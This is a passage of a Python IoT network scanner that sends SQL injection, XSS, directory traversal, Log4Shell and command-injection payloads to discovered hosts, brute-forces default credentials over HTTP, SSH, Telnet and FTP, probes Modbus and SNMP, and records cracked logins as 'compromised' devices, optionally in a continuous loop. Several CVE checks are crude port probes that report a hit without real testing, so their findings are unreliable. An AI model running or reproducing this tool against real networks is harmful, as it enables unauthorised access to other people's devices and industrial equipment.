        elif 'iis' in server:
            technologies.append('IIS')
        
        # Check for common frameworks
        content = response.text.lower()
        if 'wordpress' in content:
            technologies.append('WordPress')
        elif 'drupal' in content:
            technologies.append('Drupal')
        elif 'joomla' in content:
            technologies.append('Joomla')
        
        return technologies

    def extract_upnp_device_type(self, data):
        """Extract UPnP device type from response"""
        try:
            lines = data.split('\r\n')
            for line in lines:
                if line.startswith('ST:'):
                    return line.split(':', 1)[1].strip()
        except:
            pass
        return 'Unknown'

    def extract_upnp_location(self, data):
        """Extract UPnP location from response"""
        try:
            lines = data.split('\r\n')
            for line in lines:
                if line.startswith('LOCATION:'):
                    return line.split(':', 1)[1].strip()
        except:
            pass
        return 'Unknown'

    def extract_upnp_server(self, data):
        """Extract UPnP server from response"""
        try:
            lines = data.split('\r\n')
            for line in lines:
                if line.startswith('SERVER:'):
                    return line.split(':', 1)[1].strip()
        except:
            pass
        return 'Unknown'

    def scan_ports(self, ip):
        """Advanced port scanning with service detection"""
        open_ports = []
        
        # Use nmap for comprehensive port scanning
        try:
            self.nm.scan(ip, arguments='-sS -sU -O -sV --script vuln,default,auth')
            
            for host in self.nm.all_hosts():
                for proto in self.nm[host].all_protocols():
                    ports = self.nm[host][proto].keys()
                    for port in ports:
                        service = self.nm[host][proto][port]
                        open_ports.append((port, service.get('name', 'unknown')))
        except:
            # Fallback to manual scanning
            for port, service in self.iot_ports.items():
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.5)
                    result = sock.connect_ex((ip, port))
                    if result == 0:
                        open_ports.append((port, service))
                    sock.close()
                except:
                    pass
        
        return open_ports

    def advanced_vulnerability_scan(self, ip, device_info):
        """Advanced vulnerability scanning"""
        vulnerabilities = []
        
        # CVE scanning
        vulnerabilities.extend(self.cve_scan(ip, device_info))
        
        # Web application vulnerabilities
        vulnerabilities.extend(self.web_vuln_scan(ip, device_info))
        
        # Network service vulnerabilities
        vulnerabilities.extend(self.network_vuln_scan(ip, device_info))
        
        # IoT-specific vulnerabilities
        vulnerabilities.extend(self.iot_vuln_scan(ip, device_info))
        
        return vulnerabilities

    def cve_scan(self, ip, device_info):
        """CVE vulnerability scanning"""
        vulnerabilities = []
        
        for cve_id, cve_info in self.vuln_db.items():
            try:
                # Check if device matches CVE criteria
                if self.matches_cve_criteria(device_info, cve_info):
                    # Test for specific CVE
                    if self.test_cve(ip, cve_id, cve_info):
                        vulnerabilities.append({
                            'cve_id': cve_id,
                            'name': cve_info['name'],
                            'description': cve_info['description'],
                            'severity': cve_info['severity'],
                            'verified': True
                        })
            except Exception as e:
                logger.error(f"CVE scan error for {cve_id}: {e}")
        
        return vulnerabilities

    def web_vuln_scan(self, ip, device_info):
        """Web application vulnerability scanning"""
        vulnerabilities = []
        
        # Check for web services
        web_ports = [80, 443, 8080, 8443, 8000, 8888]
        for port in web_ports:
            if any(port == p[0] for p in device_info.get('services', {}).keys()):
                try:
                    # SQL injection testing
                    vulnerabilities.extend(self.test_sql_injection(ip, port))
                    
                    # XSS testing
                    vulnerabilities.extend(self.test_xss(ip, port))
                    
                    # Directory traversal
                    vulnerabilities.extend(self.test_directory_traversal(ip, port))
                    
                    # Default credentials
                    vulnerabilities.extend(self.test_web_default_creds(ip, port))
                    
                    # Information disclosure
                    vulnerabilities.extend(self.test_info_disclosure(ip, port))
                    
                except Exception as e:
                    logger.error(f"Web vuln scan error: {e}")
        
        return vulnerabilities

    def network_vuln_scan(self, ip, device_info):
        """Network service vulnerability scanning"""
        vulnerabilities = []
        
        # SSH vulnerabilities
        if any(22 == p[0] for p in device_info.get('services', {}).keys()):
            vulnerabilities.extend(self.test_ssh_vulnerabilities(ip))
        
        # Telnet vulnerabilities
        if any(23 == p[0] for p in device_info.get('services', {}).keys()):
            vulnerabilities.extend(self.test_telnet_vulnerabilities(ip))
        
        # SNMP vulnerabilities
        if any(161 == p[0] for p in device_info.get('services', {}).keys()):
            vulnerabilities.extend(self.test_snmp_vulnerabilities(ip))
        
        # FTP vulnerabilities
        if any(21 == p[0] for p in device_info.get('services', {}).keys()):
            vulnerabilities.extend(self.test_ftp_vulnerabilities(ip))
        
        return vulnerabilities

    def iot_vuln_scan(self, ip, device_info):
        """IoT-specific vulnerability scanning"""
        vulnerabilities = []
        
        # MQTT vulnerabilities
        if any(1883 == p[0] for p in device_info.get('services', {}).keys()):
            vulnerabilities.extend(self.test_mqtt_vulnerabilities(ip))
        
        # CoAP vulnerabilities
        if any(5683 == p[0] for p in device_info.get('services', {}).keys()):
            vulnerabilities.extend(self.test_coap_vulnerabilities(ip))
        
        # UPnP vulnerabilities
        if any(1900 == p[0] for p in device_info.get('services', {}).keys()):
            vulnerabilities.extend(self.test_upnp_vulnerabilities(ip))
        
        # Modbus vulnerabilities
        if any(502 == p[0] for p in device_info.get('services', {}).keys()):
            vulnerabilities.extend(self.test_modbus_vulnerabilities(ip))
        
        return vulnerabilities

    def test_sql_injection(self, ip, port):
        """Test for SQL injection vulnerabilities"""
        vulnerabilities = []
        
        try:
            protocol = 'https' if port in [443, 8443] else 'http'
            base_url = f"{protocol}://{ip}:{port}"
            
            # Common SQL injection payloads
            payloads = [
                "' OR '1'='1",
                "' OR 1=1--",
                "'; DROP TABLE users; --",
                "' UNION SELECT NULL--",
                "admin'--",
                "admin' OR '1'='1"
            ]
            
            # Test login forms
            login_urls = ['/login', '/admin', '/user', '/auth', '/signin']
            
            for url in login_urls:
                try:
                    response = self.session.get(f"{base_url}{url}", timeout=3, verify=False)
                    if response.status_code == 200:
                        # Look for forms
                        soup = BeautifulSoup(response.text, 'html.parser')
                        forms = soup.find_all('form')
                        
                        for form in forms:
                            for payload in payloads:
                                # Test form submission with payload
                                form_data = {}
                                inputs = form.find_all('input')
                                for input_tag in inputs:
                                    name = input_tag.get('name', '')
                                    if 'user' in name.lower() or 'login' in name.lower():
                                        form_data[name] = payload
                                    elif 'pass' in name.lower():
                                        form_data[name] = 'test'
                                    else:
                                        form_data[name] = input_tag.get('value', '')
                                
                                if form_data:
                                    post_url = form.get('action', url)
                                    if not post_url.startswith('http'):
                                        post_url = f"{base_url}{post_url}"
                                    
                                    test_response = self.session.post(post_url, data=form_data, timeout=3, verify=False)
                                    
                                    # Check for SQL error indicators
                                    error_indicators = [
                                        'sql syntax', 'mysql', 'postgresql', 'oracle',
                                        'sqlite', 'microsoft ole db', 'odbc', 'jdbc'
                                    ]
                                    
                                    if any(indicator in test_response.text.lower() for indicator in error_indicators):
                                        vulnerabilities.append({
                                            'type': 'SQL Injection',
                                            'severity': 'High',
                                            'description': f'SQL injection vulnerability found in {url}',
                                            'payload': payload,
                                            'verified': True
                                        })
                                        break
                except:
                    pass
        except Exception as e:
            logger.error(f"SQL injection test error: {e}")
        
        return vulnerabilities

    def test_xss(self, ip, port):
        """Test for XSS vulnerabilities"""
        vulnerabilities = []
        
        try:
            protocol = 'https' if port in [443, 8443] else 'http'
            base_url = f"{protocol}://{ip}:{port}"
            
            # XSS payloads
            payloads = [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')",
                "<svg onload=alert('XSS')>",
                "'><script>alert('XSS')</script>"
            ]
            
            # Test common parameters
            test_params = ['q', 'search', 'query', 'name', 'user', 'id', 'page']
            
            for param in test_params:
                for payload in payloads:
                    try:
                        url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
                        response = self.session.get(url, timeout=3, verify=False)
                        
                        if payload in response.text:
                            vulnerabilities.append({
                                'type': 'Cross-Site Scripting (XSS)',
                                'severity': 'Medium',
                                'description': f'XSS vulnerability found in parameter {param}',
                                'payload': payload,
                                'verified': True
                            })
                            break
                    except:
                        pass
        except Exception as e:
            logger.error(f"XSS test error: {e}")
        
        return vulnerabilities

    def test_directory_traversal(self, ip, port):
        """Test for directory traversal vulnerabilities"""
        vulnerabilities = []
        
        try:
            protocol = 'https' if port in [443, 8443] else 'http'
            base_url = f"{protocol}://{ip}:{port}"
            
            # Directory traversal payloads
            payloads = [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
            ]
            
            # Test common file parameters
            test_params = ['file', 'path', 'page', 'include', 'doc', 'document']
            
            for param in test_params:
                for payload in payloads:
                    try:
                        url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
                        response = self.session.get(url, timeout=3, verify=False)
                        
                        # Check for file content indicators
                        if any(indicator in response.text.lower() for indicator in ['root:', 'bin:', 'daemon:', 'localhost']):
                            vulnerabilities.append({
                                'type': 'Directory Traversal',
                                'severity': 'High',
                                'description': f'Directory traversal vulnerability found in parameter {param}',
                                'payload': payload,
                                'verified': True
                            })
                            break
                    except:
                        pass
        except Exception as e:
            logger.error(f"Directory traversal test error: {e}")
        
        return vulnerabilities

    def test_web_default_creds(self, ip, port):
        """Test web interface default credentials"""
        vulnerabilities = []
        
        try:
            protocol = 'https' if port in [443, 8443] else 'http'
            base_url = f"{protocol}://{ip}:{port}"
            
            # Test common login endpoints
            login_endpoints = ['/login', '/admin', '/user', '/auth', '/signin', '/cgi-bin/login']
            
            for endpoint in login_endpoints:
                try:
                    response = self.session.get(f"{base_url}{endpoint}", timeout=3, verify=False)
                    if response.status_code == 200 and any(keyword in response.text.lower() for keyword in ['login', 'password', 'username']):
                        
                        # Test default credentials
                        for username, password in self.credential_db['default_creds']:
                            try:
                                login_data = {
                                    'username': username,
                                    'password': password,
                                    'user': username,
                                    'pass': password,
                                    'login': username,
                                    'pwd': password
                                }
                                
                                login_response = self.session.post(f"{base_url}{endpoint}", data=login_data, timeout=3, verify=False)
                                
                                # Check for successful login indicators
                                if any(indicator in login_response.text.lower() for indicator in ['dashboard', 'welcome', 'logout', 'admin panel']):
                                    vulnerabilities.append({
                                        'type': 'Default Credentials',
                                        'severity': 'Critical',
                                        'description': f'Default credentials found: {username}:{password}',
                                        'credentials': f'{username}:{password}',
                                        'endpoint': endpoint,
                                        'verified': True
                                    })
                                    break
                            except:
                                pass
                except:
                    pass
        except Exception as e:
            logger.error(f"Web default creds test error: {e}")
        
        return vulnerabilities

    def test_info_disclosure(self, ip, port):
        """Test for information disclosure vulnerabilities"""
        vulnerabilities = []
        
        try:
            protocol = 'https' if port in [443, 8443] else 'http'
            base_url = f"{protocol}://{ip}:{port}"
            
            # Common information disclosure endpoints
            info_endpoints = [
                '/.git/config',
                '/.svn/entries',
                '/.env',
                '/config.php',
                '/wp-config.php',
                '/phpinfo.php',
                '/info.php',
                '/test.php',
                '/admin/config',
                '/backup',
                '/backup.sql',
                '/database.sql',
                '/dump.sql'
            ]
            
            for endpoint in info_endpoints:
                try:
                    response = self.session.get(f"{base_url}{endpoint}", timeout=3, verify=False)
                    if response.status_code == 200:
                        # Check for sensitive information
                        sensitive_patterns = [
                            'password', 'secret', 'key', 'token', 'api_key',
                            'database', 'mysql', 'postgresql', 'connection',
                            'config', 'settings', 'credentials'
                        ]
                        
                        if any(pattern in response.text.lower() for pattern in sensitive_patterns):
                            vulnerabilities.append({
                                'type': 'Information Disclosure',
                                'severity': 'Medium',
                                'description': f'Sensitive information disclosed at {endpoint}',
                                'endpoint': endpoint,
                                'verified': True
                            })
                except:
                    pass
        except Exception as e:
            logger.error(f"Info disclosure test error: {e}")
        
        return vulnerabilities

    def test_ssh_vulnerabilities(self, ip):
        """Test SSH service vulnerabilities"""
        vulnerabilities = []
        
        try:
            # Test for weak SSH configurations
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            # Test for weak ciphers
            weak_ciphers = ['arcfour', 'arcfour128', 'arcfour256']
            
            for cipher in weak_ciphers:
                try:
                    ssh.connect(ip, port=22, username='test', password='test', 
                              timeout=3, allow_agent=False, look_for_keys=False,
                              disabled_algorithms={'ciphers': [cipher]})
                    vulnerabilities.append({
                        'type': 'Weak SSH Cipher',
                        'severity': 'Medium',
                        'description': f'Weak SSH cipher supported: {cipher}',
                        'verified': True
                    })
                except:
                    pass
            
            # Test for SSH version disclosure
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((ip, 22))
                banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
                sock.close()
                
                if 'OpenSSH' in banner and any(version in banner for version in ['6.0', '5.9', '5.8', '5.7']):
                    vulnerabilities.append({
                        'type': 'Outdated SSH Version',
                        'severity': 'High',
                        'description': f'Outdated SSH version: {banner}',
                        'verified': True
                    })
            except:
                pass
                
        except Exception as e:
            logger.error(f"SSH vulnerability test error: {e}")
        
        return vulnerabilities

    def test_telnet_vulnerabilities(self, ip):
        """Test Telnet service vulnerabilities"""
        vulnerabilities = []
        
        try:
            # Test for unencrypted Telnet
            tn = telnetlib.Telnet(ip, 23, timeout=3)
            tn.read_until(b"login: ", timeout=3)
            tn.close()
            
            vulnerabilities.append({
                'type': 'Unencrypted Telnet',
                'severity': 'High',
                'description': 'Telnet service is unencrypted and vulnerable to sniffing',
                'verified': True
            })
            
        except Exception as e:
            logger.error(f"Telnet vulnerability test error: {e}")
        
        return vulnerabilities

    def test_snmp_vulnerabilities(self, ip):
        """Test SNMP service vulnerabilities"""
        vulnerabilities = []
        
        try:
            # Test for default community strings
            default_communities = ['public', 'private', 'admin', 'snmp', 'community', '']
            
            for community in default_communities:
                try:
                    # This would use pysnmp for actual SNMP queries
                    # For now, just check if SNMP responds
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.settimeout(2)
                    sock.sendto(b'\x30\x0c\x02\x01\x00\x04\x06' + community.encode() + b'\xa0\x05\x02\x03\x00\x00\x00', (ip, 161))
                    data, addr = sock.recvfrom(1024)
                    sock.close()
                    
                    if data:
                        vulnerabilities.append({
                            'type': 'Default SNMP Community',
                            'severity': 'High',
                            'description': f'Default SNMP community string: {community or "empty"}',
                            'community': community or 'empty',
                            'verified': True
                        })
                        break
                except:
                    pass
                    
        except Exception as e:
            logger.error(f"SNMP vulnerability test error: {e}")
        
        return vulnerabilities

    def test_ftp_vulnerabilities(self, ip):
        """Test FTP service vulnerabilities"""
        vulnerabilities = []
        
        try:
            # Test for anonymous FTP
            import ftplib
            ftp = ftplib.FTP()
            ftp.connect(ip, 21, timeout=3)
            ftp.login('anonymous', 'anonymous@test.com')
            
            vulnerabilities.append({
                'type': 'Anonymous FTP Access',
                'severity': 'Medium',
                'description': 'Anonymous FTP access is enabled',
                'verified': True
            })
            
            ftp.quit()
            
        except Exception as e:
            # Test for weak FTP credentials
            try:
                for username, password in self.credential_db['default_creds']:
                    try:
                        ftp = ftplib.FTP()
                        ftp.connect(ip, 21, timeout=3)
                        ftp.login(username, password)
                        
                        vulnerabilities.append({
                            'type': 'Default FTP Credentials',
                            'severity': 'Critical',
                            'description': f'Default FTP credentials: {username}:{password}',
                            'credentials': f'{username}:{password}',
                            'verified': True
                        })
                        
                        ftp.quit()
                        break
                    except Exception:
                        pass
            except Exception:
                pass
        
        return vulnerabilities

    def test_mqtt_vulnerabilities(self, ip):
        """Test MQTT service vulnerabilities"""
        vulnerabilities = []
        
        try:
            # Test for unauthenticated MQTT
            import paho.mqtt.client as mqtt
            
            def on_connect(client, userdata, flags, rc):
                if rc == 0:
                    vulnerabilities.append({
                        'type': 'Unauthenticated MQTT',
                        'severity': 'High',
                        'description': 'MQTT broker allows unauthenticated connections',
                        'verified': True
                    })
            
            client = mqtt.Client()
            client.on_connect = on_connect
            client.connect(ip, 1883, 3)
            client.loop_start()
            time.sleep(2)
            client.loop_stop()
            client.disconnect()
            
        except Exception as e:
            logger.error(f"MQTT vulnerability test error: {e}")
        
        return vulnerabilities

    def test_coap_vulnerabilities(self, ip):
        """Test CoAP service vulnerabilities"""
        vulnerabilities = []
        
        try:
            # Test for CoAP information disclosure
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(3)
            
            # Send CoAP GET request to /.well-known/core
            coap_request = b'\x40\x01\x00\x00\x39\x61\x2e\x77\x65\x6c\x6c\x2d\x6b\x6e\x6f\x77\x6e\x2f\x63\x6f\x72\x65'
            sock.sendto(coap_request, (ip, 5683))
            
            try:
                data, addr = sock.recvfrom(1024)
                if data:
                    vulnerabilities.append({
                        'type': 'CoAP Information Disclosure',
                        'severity': 'Medium',
                        'description': 'CoAP service exposes resource information',
                        'verified': True
                    })
            except socket.timeout:
                pass
            
            sock.close()
            
        except Exception as e:
            logger.error(f"CoAP vulnerability test error: {e}")
        
        return vulnerabilities

    def test_upnp_vulnerabilities(self, ip):
        """Test UPnP service vulnerabilities"""
        vulnerabilities = []
        
        try:
            # Test for UPnP information disclosure
            ssdp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            ssdp_socket.settimeout(3)
            
            ssdp_msg = (
                "M-SEARCH * HTTP/1.1\r\n"
                f"HOST: {ip}:1900\r\n"
                "MAN: \"ssdp:discover\"\r\n"
                "ST: upnp:rootdevice\r\n"
                "MX: 3\r\n\r\n"
            )
            
            ssdp_socket.sendto(ssdp_msg.encode(), (ip, 1900))
            
            try:
                data, addr = ssdp_socket.recvfrom(1024)
                if data:
                    vulnerabilities.append({
                        'type': 'UPnP Information Disclosure',
                        'severity': 'Low',
                        'description': 'UPnP service exposes device information',
                        'verified': True
                    })
            except socket.timeout:
                pass
            
            ssdp_socket.close()
            
        except Exception as e:
            logger.error(f"UPnP vulnerability test error: {e}")
        
        return vulnerabilities

    def test_modbus_vulnerabilities(self, ip):
        """Test Modbus service vulnerabilities"""
        vulnerabilities = []
        
        try:
            # Test for unauthenticated Modbus
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((ip, 502))
            
            # Send Modbus read holding registers request
            modbus_request = b'\x00\x01\x00\x00\x00\x06\x01\x03\x00\x00\x00\x01'
            sock.send(modbus_request)
            
            try:
                data = sock.recv(1024)
                if data:
                    vulnerabilities.append({
                        'type': 'Unauthenticated Modbus',
                        'severity': 'High',
                        'description': 'Modbus service allows unauthenticated access',
                        'verified': True
                    })
            except socket.timeout:
                pass
            
            sock.close()
            
        except Exception as e:
            logger.error(f"Modbus vulnerability test error: {e}")
        
        return vulnerabilities

    def matches_cve_criteria(self, device_info, cve_info):
        """Check if device matches CVE criteria"""
        try:
            # Check ports
            open_ports = [port for port, _ in device_info.get('services', {}).keys()]
            if not any(port in open_ports for port in cve_info.get('ports', [])):
                return False
            
            # Check detection keywords
            banners = str(device_info.get('banner', {})).lower()
            services = str(device_info.get('services', {})).lower()
            
            detection_keywords = cve_info.get('detection', [])
            if detection_keywords:
                return any(keyword.lower() in banners or keyword.lower() in services 
                          for keyword in detection_keywords)
            
            return True
        except:
            return False

    def test_cve(self, ip, cve_id, cve_info):
        """Test for specific CVE"""
        try:
            if cve_id == 'cve_2021_44228':  # Log4Shell
                return self.test_log4shell(ip)
            elif cve_id == 'cve_2021_20016':  # SonicWall
                return self.test_sonicwall_rce(ip)
            elif cve_id == 'cve_2020_1472':  # Zerologon
                return self.test_zerologon(ip)
            elif cve_id == 'cve_2019_0708':  # BlueKeep
                return self.test_bluekeep(ip)
            elif cve_id == 'cve_2017_0144':  # EternalBlue
                return self.test_eternalblue(ip)
        except Exception as e:
            logger.error(f"CVE test error for {cve_id}: {e}")
        
        return False

    def test_log4shell(self, ip):
        """Test for Log4Shell vulnerability"""
        try:
            # Test for Log4Shell in web applications
            web_ports = [80, 443, 8080, 8443]
            for port in web_ports:
                try:
                    protocol = 'https' if port in [443, 8443] else 'http'
                    url = f"{protocol}://{ip}:{port}"
                    
                    # Log4Shell payload
                    payload = "${jndi:ldap://test.example.com/a}"
                    
                    # Test common parameters
                    test_params = ['q', 'search', 'query', 'name', 'user', 'id']
                    for param in test_params:
                        test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                        response = self.session.get(test_url, timeout=3, verify=False)
                        
                        # Look for JNDI error indicators
                        if any(indicator in response.text.lower() for indicator in ['jndi', 'ldap', 'naming']):
                            return True
                except:
                    pass
        except:
            pass
        
        return False

    def test_sonicwall_rce(self, ip):
        """Test for SonicWall SMA100 RCE"""
        try:
            # Test for SonicWall SMA100
            url = f"https://{ip}/cgi-bin/login"
            response = self.session.get(url, timeout=3, verify=False)
            
            if 'sonicwall' in response.text.lower() and 'sma' in response.text.lower():
                # Test for RCE vulnerability
                rce_payload = "test; id; echo"
                rce_data = {'username': rce_payload, 'password': 'test'}
                
                rce_response = self.session.post(url, data=rce_data, timeout=3, verify=False)
                if 'uid=' in rce_response.text or 'gid=' in rce_response.text:
                    return True
        except:
            pass
        
        return False

    def test_zerologon(self, ip):
        """Test for Zerologon vulnerability"""
        try:
            # This would require the actual Zerologon exploit
            # For now, just check if it's a Windows domain controller
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((ip, 445))
            sock.close()
            
            # Check for domain controller indicators
            try:
                response = self.session.get(f"http://{ip}", timeout=3, verify=False)
                if any(indicator in response.text.lower() for indicator in ['domain', 'active directory', 'windows']):
                    return True
            except:
                pass
        except:
            pass
        
        return False

    def test_bluekeep(self, ip):
        """Test for BlueKeep vulnerability"""
        try:
            # Test for RDP service
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((ip, 3389))
            
            # Send RDP connection request
            rdp_request = b'\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00'
            sock.send(rdp_request)
            
            try:
                data = sock.recv(1024)
                if data and len(data) > 10:
                    # Check for vulnerable RDP version indicators
                    return True
            except socket.timeout:
                pass
            
            sock.close()
        except:
            pass
        
        return False

    def test_eternalblue(self, ip):
        """Test for EternalBlue vulnerability"""
        try:
            # Test for SMB service
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((ip, 445))
            
            # Send SMB negotiation request
            smb_request = b'\x00\x00\x00\x85\xff\x53\x4d\x42\x72\x00\x00\x00\x00\x18\x53\xc8\x00\x00'
            sock.send(smb_request)
            
            try:
                data = sock.recv(1024)
                if data and len(data) > 10:
                    # Check for vulnerable SMB version indicators
                    return True
            except socket.timeout:
                pass
            
            sock.close()
        except:
            pass
        
        return False

    def test_http_auth(self, ip, port=80):
        """Test HTTP basic authentication"""
        for username, password in self.default_creds:
            try:
                url = f"http://{ip}:{port}"
                response = requests.get(url, auth=(username, password), timeout=2)
                if response.status_code == 200:
                    return (username, password, 'HTTP')
            except:
                pass
        return None

    def test_ssh_auth(self, ip, port=22):
        """Test SSH authentication"""
        for username, password in self.default_creds:
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(ip, port=port, username=username, password=password, timeout=3)
                ssh.close()
                return (username, password, 'SSH')
            except:
                pass
        return None

    def test_telnet_auth(self, ip, port=23):
        """Test Telnet authentication"""
        for username, password in self.default_creds:
            try:
                tn = telnetlib.Telnet(ip, port, timeout=3)
                tn.read_until(b"login: ", timeout=3)
                tn.write(username.encode('ascii') + b"\n")
                tn.read_until(b"Password: ", timeout=3)
                tn.write(password.encode('ascii') + b"\n")
                result = tn.read_some()
                tn.close()
                if b"$" in result or b"#" in result or b">" in result:
                    return (username, password, 'Telnet')
            except:
                pass
        return None

    def test_device_credentials(self, ip, open_ports):
        """Test default credentials on all open ports"""
        for port, service in open_ports:
            if service == 'HTTP' or service == 'HTTPS':
                result = self.test_http_auth(ip, port)
                if result:
                    return result
            elif service == 'SSH':
                result = self.test_ssh_auth(ip, port)
                if result:
                    return result
            elif service == 'Telnet':
                result = self.test_telnet_auth(ip, port)
                if result:
                    return result
        return None

    def scan_device(self, ip):
        """Complete scan of a single device"""
        logger.info(f"Scanning device: {ip}")
        
        # Scan ports
        open_ports = self.scan_ports(ip)
        if not open_ports:
            return None
            
        # Test credentials
        cred_result = self.test_device_credentials(ip, open_ports)
        
        device_info = {
            'ip': ip,
            'open_ports': open_ports,
            'timestamp': datetime.now().isoformat(),
            'compromised': cred_result is not None
        }
        
        if cred_result:
            device_info['credentials'] = {
                'username': cred_result[0],
                'password': cred_result[1],
                'service': cred_result[2]
            }
            with self.lock:
                self.compromised_devices.append(device_info)
            logger.info(f"COMPROMISED: {ip} - {cred_result[0]}:{cred_result[1]} via {cred_result[2]}")
        else:
            logger.info(f"Secure: {ip} - No default credentials found")
            
        return device_info

    def run_scan(self):
        """Run the complete IoT scan"""
        logger.info("Starting IoT device scan...")
        start_time = time.time()
        
        # Step 1: Find live hosts
        self.scan_network()
        logger.info(f"Found {len(self.found_devices)} live hosts")
        
        # Step 2: Scan each device
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = []
            for ip in self.found_devices:
                future = executor.submit(self.scan_device, ip)
                futures.append(future)
            
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    logger.error(f"Error scanning device: {e}")
        
        # Results
        scan_time = time.time() - start_time
        logger.info(f"Scan completed in {scan_time:.2f} seconds")
        logger.info(f"Total devices found: {len(self.found_devices)}")
        logger.info(f"Compromised devices: {len(self.compromised_devices)}")
        
        return {
            'total_devices': len(self.found_devices),
            'compromised_devices': len(self.compromised_devices),
            'scan_time': scan_time,
            'compromised_list': self.compromised_devices
        }

    def save_results(self, filename="iot_scan_results.json"):
        """Save scan results to file"""
        results = {
            'scan_timestamp': datetime.now().isoformat(),
            'network_range': self.network_range,
            'total_devices': len(self.found_devices),
            'compromised_devices': len(self.compromised_devices),
            'compromised_list': self.compromised_devices
        }
        
        with open(filename, 'w') as f:
            json.dump(results, f, indent=2)
        logger.info(f"Results saved to {filename}")

    def continuous_scan(self, interval=300):
        """Run continuous scanning"""
        logger.info(f"Starting continuous scan every {interval} seconds")
        while True:
            try:
                self.run_scan()
                self.save_results()
                time.sleep(interval)
            except KeyboardInterrupt:
                logger.info("Scan interrupted by user")
                break
            except Exception as e:
                logger.error(f"Error in continuous scan: {e}")
                time.sleep(60)  # Wait before retrying

if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="IoT Device Scanner")
    parser.add_argument("--network", default="192.168.1.0/24", help="Network range to scan")
    parser.add_argument("--threads", type=int, default=100, help="Maximum threads")
    parser.add_argument("--continuous", action="store_true", help="Run continuous scan")
    parser.add_argument("--interval", type=int, default=300, help="Scan interval in seconds")
    
    args = parser.parse_args()
    
    scanner = IoTScanner(network_range=args.network, max_threads=args.threads)
    
    if args.continuous:
        scanner.continuous_scan(args.interval)
    else:
        results = scanner.run_scan()
        scanner.save_results()
        print(f"\nScan Results:")
        print(f"Total devices: {results['total_devices']}")
        print(f"Compromised devices: {results['compromised_devices']}")
        print(f"Scan time: {results['scan_time']:.2f} seconds")
